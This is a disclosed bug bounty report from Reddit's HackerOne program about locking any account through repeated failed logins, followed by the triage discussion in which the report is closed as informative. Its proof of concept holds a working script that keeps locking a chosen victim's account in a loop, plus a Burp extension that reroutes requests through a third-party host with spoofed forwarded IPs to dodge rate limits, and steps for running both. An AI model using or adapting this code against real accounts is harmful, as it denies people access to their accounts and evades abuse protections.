---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - env/web
substate: "informative"
weakness: null
enriched: true
body: true
date: 2022-06-06
submitted: 2022-05-27T10:17:28.931Z
bounty_usd: null
votes: 19
cve: []
program: "[[programs/reddit|Reddit]]"
reporter: "ug0x01"
source: "https://hackerone.com/reports/1582778"
title: "Misconfigurated login page able to lock login action for any account without user interaction"
---
# Misconfigurated login page able to lock login action for any account without user interaction

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 19 | **Program:** Reddit | **Disclosed:** 2022-06-06

- Report: [https://hackerone.com/reports/1582778](https://hackerone.com/reports/1582778)
- CWE: N/A
- Submitted: 2022-05-27T10:17:28.931Z

## Report summary

A punishment for every mistake, a reward for every kindness

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary
While observing a few things about the login feature, I found that the account was locked after a certain number of requests. Although this feature is actually added to prevent problems such as rate limit, it is open to account lock attacks by attackers.

## PoC
1. Save this code as `exploit.py`:

```
#!/bin/python3

from requests import get, post
from sys import argv
from warnings import filterwarnings
from time import sleep
from concurrent.futures import ThreadPoolExecutor

filterwarnings("ignore")

def get_creds():
    res = get("https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled")
    
    csrf_token = res.text.split('name="csrf_token" value="')[1].split('">')[0]
    
    return res.cookies.get_dict(), csrf_token

def lock_account(account, cookie, csrf_token):
    post("https://www.reddit.com/login", cookies=cookie, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, data={"csrf_token": csrf_token, "otp": '', "password": "asdasdasasdasd231321d", "dest": "https://www.reddit.com", "username": account}, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.reddit.com", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Referer": "https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled", "Connection": "close"}, verify=False)

cookie, csrf_token = get_creds()
    
for _ in range(14):
    ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)

print("Account Locked!!")
        
sleep(60)
    
while True:
    cookie, csrf_token = get_creds()
    
    for _ in range(14):
        ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)
        
    sleep(60)
```
2. Save this code as `helper.py`:
```
from burp import IBurpExtender
from burp import IHttpListener

import random
import socket
import struct

HOST_FROM = "www.reddit.com"
HOST_TO = "ugroon.link"

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._helpers = callbacks.getHelpers()
        
        callbacks.setExtensionName("Traffic redirector")
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        helpers = self._helpers
        if not messageIsRequest:
            return
        httpService = messageInfo.getHttpService()

        if (HOST_FROM == httpService.getHost()):
            message = helpers.bytesToString(messageInfo.getRequest())
            message = message.replace("Host: " + HOST_FROM, "Host: " + HOST_TO)
            message_array = message.split("\n")
            random_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
            message_array.insert(3, "X-My-X-Forwarded-For: " + random_ip)
            message = "\n".join(message_array)
            
            print(message)
            
            message = helpers.stringToBytes(message)
            messageInfo.setHttpService(self._helpers.buildHttpService(HOST_TO,httpService.getPort(),httpService.getProtocol()))

```
3. Download jython 2.7.0 (http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar)
4. Download a burp which is older than 2021 version (new versions giving too many errors)
5. Set jython 2.7.0 with `Extender > Options > Python Environment > Location of Jython standalone JAR file > jython 2.7.0 location`
6. Upload `helper.py` to extensions with `Extender >  Extensions > Burp Extensions > Add > helper.py location`
7. If you use linux, use `chmod +x exploit.py` for set permissions. But if you use windows, directly go to path and do next step
8. Run the exploit with `python3 exploit.py usernameofvictim` and that's all.
9. And for check to exploit work or not, try to login victim account on another device or change IP address and use a different browser for 0 track and you will see it's impossible to login account.

##PoC video

{F1746674}

#Suggested Solutions
To avoid issues like rate limit, use protections like captcha instead of using such protection

##Notes
1. On the login screen it says the account has been locked for 5 minutes. However, the exploit restarts the attack every 5 minutes, so victim can "never" login into the victim account (added for avoid misunderstandings)
2. If you have any questions or what you think is wrong with the report/impact, please mark it as needs more info before closing the report and let me answer your questions.

Cheers,
@h1ugroon

## Impact

Once the attacker starts the attack for the victim account, victim will never be able to login his/her account until the attacker stops the attack.

## Timeline

- **Report Filed**
- **2022-05-29** @ug0x01: {F1748443}

So, any update?
- **2022-05-31** @h1_analyst_arthur: Hi @h1ugroon,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@1nfinit3
- **Report Informative**
- **2022-05-31** @ug0x01: Hey @1nfinit3, thanks for your reply 

> The account lockout is not permanent and can be unlocked by the user

User can not unlock the account and also lockout is permanent.

> It looks that the error you are getting is due to rate limit is triggered after X attempts and your IP has been restricted from accessing that account

No, each request is sent with a different IP address via helper.py. You can try it yourself, if you send over X requests, reddit will block your IP and will start to giving 429 but as what I said each request is sent with a different IP address via helper.py. So, then you can test it with helper.py.

> If you can show a permanent lockout to user’s account

Please create a test account and give me username and then just let me show you what will be happened :)

Cheers,
@h1ugroon
- **2022-05-31** @h1_analyst_arthur: Hello @h1ugroon, 

Please use this email to carry out the attack: `1nfinit3@wearehackerone.com`

Best,
@1nfinit3
- **2022-05-31** @ug0x01: Hey @1nfinit3,

Just username required for attack. So, can you send your username? If your username is `1nfinit3` please let me know

{F1751654}

Best Regards,
@h1ugroon
- **2022-05-31** @h1_analyst_arthur: Hello @h1ugroon, 

Username is `1nfinit3_H1`. 

Best,
@1nfinit3
- **2022-05-31** @ug0x01: Hey @1nfinit3,

Started attack and tried to login on 2 devices.

This is my device

{F1751797}

And this is my friend's device

{F1751798}

After verifying the issue, please let me know and I will stop the attack

Best Regards,
@h1ugroon
- **2022-06-01** @h1_analyst_arthur: Hello @h1ugroon, 

As I can see from your PoC, the application has a cooldown period. You may be running the script continuously but that comes under resource exhaustion (denial of service) category that is generally considered OOS. 

However, I was able to login in a new session and also my old session was not expired, attaching a screenshot for your reference. 
{F1752172}

Having said that, I will keep this issue closed as `Informative`. 

Best,
@1nfinit3
- **2022-06-01** @ug0x01: Hey @1nfinit3,

This is because of I was have to go to sleep and my internet connection has been cut off. Now I have started exploit again. So, can you try to login again?
- **2022-06-01** @ug0x01: {F1752329}
- **2022-06-01** @h1_analyst_arthur: Hello @h1ugroon, 

I can successfully log in to my user account. 

Best,
@1nfinit3
- **2022-06-01** @ug0x01: Hey @1nfinit3,

Do you use vpn or vps? And what is your browser version? Because I can reproduce the issue with chrome latest on a normal device but I can't reproduce with VPN/VPS/Old browsers. 

{F1752646}

As you can see I've used tor
- **2022-06-01** @ug0x01: I used tor, my phone, my friend's computer and my own computer. Seems blocked for all?
- **Agreed On Going Public**
- **2022-06-01** @gunther_reddit: We have different ratelimits based on if the current IP has been associated with a successful login on the account or not. So while yes, this causes a ratelimit with random IPs, a successful login for a "seen before" IP will work just fine. Agree this should be closed, no action will be taken
- **2022-06-01** @ug0x01: Hey @gunther_reddit,

> a successful login for a "seen before" IP will work just fine

No you can test, it's blocking a "seen before" IP too
- **2022-06-01** @ug0x01: You can check my first attachment (PoC video on report (https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/h11p01gfdkpfho5z7qc53fu0w148?response-content-disposition=attachment%3B%20filename%3D%22recording-1653645412706.webm%22%3B%20filename%2A%3DUTF-8%27%27recording-1653645412706.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=[REDACTED - see source report]%2F20220601%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220601T141925Z&X-Amz-Expires=3600&X-Amz-Security-Token=[REDACTED]&X-Amz-SignedHeaders=host&X-Amz-Signature=48857f13eada245e5c07aeb1f5cd77833cdd66ac75134336c2cd219734ade4fc))
- **2022-06-01** @ug0x01: I don't know if you fixed the issue after reporting but in the PoC in the report, you can clearly see that it also blocked a "seen before" IP.
- **2022-06-01** @ug0x01: {F1752845}
- **Hacker Requested Mediation**
- **Agreed On Going Public**
- **Report Became Public**
- **2023-03-10** @ug0x01: I think they are good scammers
